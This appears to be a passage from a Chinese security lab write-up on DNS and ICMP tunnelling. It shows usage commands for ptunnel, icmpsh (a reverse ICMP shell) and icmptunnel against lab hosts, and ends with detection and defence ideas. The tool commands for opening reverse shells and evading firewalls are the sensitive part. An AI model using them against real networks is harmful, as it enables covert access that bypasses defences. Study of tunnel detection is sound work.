一、要求
  * dnslib
  * dnspython
  * pycrypto
KaliLinux 默认 python 环境为 2.7 以上（默认已安装好），以上三个包需要使用pip 进行安装。
二、注意
  * 首先运行服务端脚本
  * 不要忘记更改您的秘密密钥（可在代码里面改）
三、原理解析
> 
四、细节
1） Server 端服务器监听状态
2) Client 端请求状态
3) 成功反弹 Shell
五、利用 tcpdump 进行数据包抓取  
抓取主机：192.168.30.129 与 192.168.30.130 的通信数据包，保存为 root 目录下 DNSShell.cap
    tcpdump -n -i eth0 host 192.168.30.129and 192.168.30.130 -w /root/DNSShell.cap
数据包解析情况
###  ICMP隧道
将IP流量封装进 IMCP 的 ping 数据包中，旨在利用 ping 穿透防火墙的检测，因为通常防火墙是不会屏蔽 ping 数据包。  
原理解析：
> 请求端的 Ping 工具通常会在 ICMP 数据包后面附加上一段随机的数据作为 Payload，而响应端则会拷贝这段 Payload 到 ICMP
> 响应数据包中返还给请求端，用于识别和匹配 Ping 请求（Windows 和 Linux 系统下的Ping 工具默认的 Payload 长度为
> 64bit，但实际上协议允许附加最大 64K 大小的Payload）
最后一个 Payload 字段是可以存放任何数据的，长度的话 理论上 ICMP 包外的 IP 包长度不超过 MTU 即可，但是实际上传不了那么大。
​ ICMP echo-request header
**ptunnel**
一个隧道工具，允许您通过可靠的 TCP 隧道连接一个远程主机，并使用 ICMP 回送请求和应答包，俗称 ping 请求和回复。
> 
使用场景简介：
> 两台机器间,除了允许相互 ping 即icmp 通信,其他的 tcp/udp 端口一律不允许,此时我们就可考虑利用 icmp 隧道进行穿透。
这里引用： Kionsec 的《利用icmp 隧道轻松穿透tcp/udp 四层封锁》
> 
流程如下
**icmpsh**
icmpsh 是一个简单的反向 ICMPshell ，与其他类似的开源工具相比，其主要优势在于它不需要管理权限即可在目标计算机上运行。
> 
一、Usage
1）Server
禁用ICMP
> sysctl -wnet.ipv4.icmp_echo_ignore_all=1
设置监听 python icmpsh_m.pysrc(host：本地机器) dst(host：目标机器)
> ./icmpsh_m.py 192.168.30.130 192.168.30.134
反弹上线
2) Client  
反弹 shell 建立 session
> icmpsh.exe -t 192.168.30.130
-r 参数 利用 test 账户进行测试
> icmpsh.exe -t 192.168.30.130 -r
3）数据包特征
4) Icmpsh –r参数
**icmptunnel**
icmptunnel 可以将 IP 流量封装进 IMCP 的 ping 数据包中，旨在利用 ping 穿透防火墙的检测。
对于隧道数据，icmptunnel 首先会指定客户端和服务器端。随后，客户端会将 IP 帧封装在 ICMP
请求数据包中发送给服务器，而服务器端则会使用相匹配的 ICMP 响应数据包进行回复（icmptunnel 提供在状态机防火墙和 NAT
网络之间，更加可靠的连接）。
> 
一、编译
    $ git clone https://github.com/jamesbarlow/icmptunnel.git  
    $ cd icmptunnel/ 
    $ make
二、Usage  
Server 与 Client 端禁止 ICMP 响应
> $ echo 1 >/proc/sys/net/ipv4/icmp_echo_ignore_all
在服务端以服务器模式启动 icmptunnel，并给隧道接口分配一个 IP 地址
    $./icmptunnel -s
    openedtunnel device: tun0  
    (ctrl-z)
    $ bg
    $ /sbin/ifconfig tun0 10.0.0.1 netmask255.255.255.0
在客户端，使用 icmptunnel 连接上服务器，并给隧道接口分配一个 IP 地址
    $ ./icmptunnel192.168.30.129
    opened tunnel device: tun0  
    connection established.  
    (ctrl-z)
    $ bg
    $ /sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0
这样我们就拥有一个端到端基于 ICMP 数据包的隧道了,其中服务器地址为 10.10.0.1，客户端地址为 10.10.0.2,在客户端可以尝试通过 SSH
连接服务器：
> $ssh [root@10.0.0](mailto:root@10.0.0).1
数据流特征
检测与防御：  
检测：  
1、检测同一来源 ICMP 数据包的数量。一个正常的 ping 每秒最多只会发送两个数据包，而使用 ICMP隧道的浏览器在同一时间会产生上千个 ICMP
数据包。  
2、注意那些 ICMP 数据包中 payload 大于 64 比特的数据包。当然 icmptunnel 可以配置限制所有数据包的 payload 为 64
比特，这样会使得更难以被检测到。  
3、寻找那些响应数据包中 payload 跟请求数据包不一致的 ICMP 数据包。  
4、检查 ICMP 数据包的协议标签。例如，icmptunnel 会在所有的 ICMPpayload 前面增加 ‘TUNL’
标记以用于识别隧道，这就是特征。  
防御：禁止 ping。
## 总结与思考
在一开始，我们就介绍了载荷分析和流量监测两种常规的检测方法，这两种方式不适用于高隐蔽性新型隧道木马检测，从我们测试提取的特征中，将样本特征添加到设备作为监测对象效率依旧低下。
思考：
> 我们是否可以用深度学习算法及自动检测技术来实现呢？
我们可以结合协议本身，基于通信行为检测隧道木马，,采用 Winpcap 数据包捕获技术的底层过滤机制，抓取 DNS 流量.将抓取的 DNS
流量按照五元组进行聚类,形成 DNS 会话数据流.将一个个 DNS 会话数据流提取成 DNS 会话评估向量,作为分类训练模块和木马流量监测的输入。  
DNS隧道木马检测流程框架
## 相关附件
主要为本次实验的相关流量包及 2 个视频
链接：
提取码：4ygn
## 参考链接